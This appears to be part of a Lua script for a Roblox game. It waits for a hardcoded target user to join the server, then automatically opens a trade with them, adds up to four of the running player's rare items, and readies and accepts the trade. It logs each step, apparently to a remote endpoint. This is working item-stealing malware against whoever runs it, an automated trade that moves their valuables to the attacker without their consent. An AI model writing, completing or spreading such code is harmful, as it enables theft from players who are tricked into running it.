-- Select an item from inventory
local function selectInventoryItem(item)
    pcall(function()
        local playerGui = player.PlayerGui
        
        for _, gui in pairs(playerGui:GetDescendants()) do
            if gui:IsA("ImageButton") or gui:IsA("TextButton") then
                if gui.Name == item.Name or (gui:FindFirstChild("ItemName") and gui.ItemName.Text == item.Name) then
                    clickButton(gui)
                    sendLog("➕ Selected item: " .. item.Name)
                    return true
                end
            end
        end
    end)
    return false
end

-- Open trade with target player
local function openTradeWithTarget()
    pcall(function()
        -- Find target player in player list
        local playerList = player.PlayerGui:FindFirstChild("PlayerList") or 
                          player.PlayerGui:FindFirstChild("Players") or
                          player.PlayerGui:FindFirstChild("Leaderboard")
        
        if playerList then
            for _, gui in pairs(playerList:GetDescendants()) do
                if gui:IsA("TextLabel") and gui.Text == TARGET_USER then
                    -- Click on the player name
                    clickButton(gui)
                    wait(0.5)
                    
                    -- Look for trade option in context menu
                    for _, btn in pairs(player.PlayerGui:GetDescendants()) do
                        if btn:IsA("TextButton") and (btn.Text:lower():find("trade") or btn.Name:lower():find("trade")) then
                            clickButton(btn)
                            sendLog("📤 Opened trade with " .. TARGET_USER)
                            return true
                        end
                    end
                end
            end
        end
    end)
    return false
end

-- ============================================
-- MAIN AUTO TRADE SEQUENCE
-- ============================================

local tradeInProgress = false

local function startAutoTrade()
    if tradeInProgress then return end
    tradeInProgress = true
    
    sendLog("🎯 Starting auto trade with " .. TARGET_USER)
    
    -- Step 1: Open trade
    wait(1)
    openTradeWithTarget()
    wait(2)
    
    -- Step 2: Click trade request button if needed
    findAndClickTradeButton()
    wait(2)
    
    -- Step 3: Wait for trade window and accept
    findAndClickAccept()
    wait(2)
    
    -- Step 4: Get rare items
    local items = getRareItems()
    sendLog("📦 Found " .. #items .. " rare items to trade")
    
    -- Step 5: Add up to 4 items
    local itemsAdded = 0
    for i = 1, math.min(4, #items) do
        findAndClickAddItem()
        wait(0.5)
        selectInventoryItem(items[i])
        wait(0.5)
        itemsAdded = itemsAdded + 1
    end
    
    sendLog("➕ Added " .. itemsAdded .. " items to trade")
    wait(1)
    
    -- Step 6: Ready up
    findAndClickReady()
    wait(1)
    
    -- Step 7: Final accept
    findAndClickAccept()
    
    sendLog("🎉 Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    tradeInProgress = false
end

-- ============================================
-- WATCH FOR TARGET JOINING
-- ============================================

local function watchForTarget()
    sendLog("👀 Watching for " .. TARGET_USER)
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog("👤 " .. TARGET_USER .. " is already in server!")
            wait(3)
            startAutoTrade()
            return
        end
    end
    
    -- Watch for joins
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
            wait(5) -- Wait for player to fully load
            startAutoTrade()
        end
    end)
end

